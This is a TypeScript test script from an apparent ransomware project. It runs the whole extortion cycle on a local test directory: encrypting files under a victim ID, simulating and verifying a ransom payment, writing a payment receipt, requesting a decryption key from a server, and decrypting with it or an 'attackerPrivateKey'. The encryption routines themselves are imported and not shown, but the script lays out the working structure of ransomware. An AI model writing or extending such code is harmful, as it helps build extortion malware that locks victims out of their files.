/**
 * Test script to verify the proper integration of requestDecryptionCredentials
 * with the decryption workflow.
 */

import path from 'path'
import fs from 'fs'
import {
    encryptTargetFiles,
    decryptFiles,
    simulatePayment,
    verifyPayment,
    createPaymentReceipt
} from './ransomware'
import { requestDecryptionCredentials } from './ransomware/keyManager'

// Directory to use for testing
const TEST_DIR = path.join(process.cwd(), 'test_directory')

/**
 * Main test function to run the full encryption/decryption workflow
 * with proper credential request.
 */
async function runTest() {
    try {
        console.log('=== TESTING DECRYPTION WORKFLOW ===')
        console.log(`Target Directory: ${TEST_DIR}`)

        // STEP 1: Encryption
        console.log('\n=== STEP 1: Encryption ===')
        const encryptionResults = await encryptTargetFiles(TEST_DIR, true)
        console.log(
            `Encrypted ${encryptionResults.encryptedFiles.length} files.`
        )
        console.log(`Victim ID: ${encryptionResults.victimId}`)

        // STEP 2: Payment Simulation
        console.log('\n=== STEP 2: Payment Simulation ===')
        const { transactionId } = await simulatePayment(
            encryptionResults.victimId
        )
        console.log(`Payment Transaction ID: ${transactionId}`)

        // STEP 3: Payment Verification
        console.log('\n=== STEP 3: Payment Verification ===')
        const verified = await verifyPayment(
            transactionId,
            encryptionResults.victimId
        )
        console.log(
            `Payment Verification: ${verified ? 'Successful' : 'Failed'}`
        )

        if (!verified) {
            throw new Error(
                'Payment verification failed. Cannot proceed with decryption.'
            )
        }

        // STEP 4: Create Payment Receipt
        console.log('\n=== STEP 4: Create Payment Receipt ===')
        await createPaymentReceipt(
            encryptionResults.victimId,
            transactionId,
            TEST_DIR
        )
        console.log('Payment receipt created.')

        // STEP 5: Request Decryption Credentials
        console.log('\n=== STEP 5: Request Decryption Credentials ===')
        const decryptionCreds = await requestDecryptionCredentials(
            encryptionResults.victimId,
            transactionId
        )

        if (!decryptionCreds.success) {
            throw new Error(
                'Failed to obtain decryption credentials from server.'
            )
        }

        console.log('Successfully received decryption credentials from server.')

        // STEP 6: Decrypt Files using the received credentials
        console.log('\n=== STEP 6: Decrypt Files ===')
        const decryptedFiles = await decryptFiles(
            TEST_DIR,
            encryptionResults.encryptedAESKey,
            decryptionCreds.privateKey || encryptionResults.attackerPrivateKey
        )

        console.log(`Successfully decrypted ${decryptedFiles.length} files.`)
        console.log('\nTest completed successfully!')
    } catch (error) {
        console.error(`\nTEST FAILED: ${error}`)
        process.exit(1)
    }
}

// Run the test
runTest()
